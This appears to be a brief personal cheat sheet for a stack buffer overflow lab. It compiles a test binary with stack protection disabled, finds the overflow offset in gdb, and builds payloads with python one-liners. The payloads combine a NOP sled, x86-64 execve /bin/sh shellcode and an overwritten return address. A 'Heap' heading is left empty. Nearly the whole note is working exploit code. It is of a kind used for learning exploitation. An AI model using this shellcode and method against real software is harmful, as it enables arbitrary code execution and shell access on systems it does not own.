# Buffer Overflow via Stack
gcc -o stackOverflow stackOverflow.c -fno-stack-protector -z execstack
gdb overflow
pattern_create 550 pattern
run $(cat pattern)
pattern_search
run $(python -c 'print "\x90"*450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41"*43 + "b"*6')
x/200x
run $(python2 -c 'print "\x90"*450 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "\x41"*43 + "\xf0\xe2\xff\xff\xff\x7f"')


# Buffer Overflow via Heap
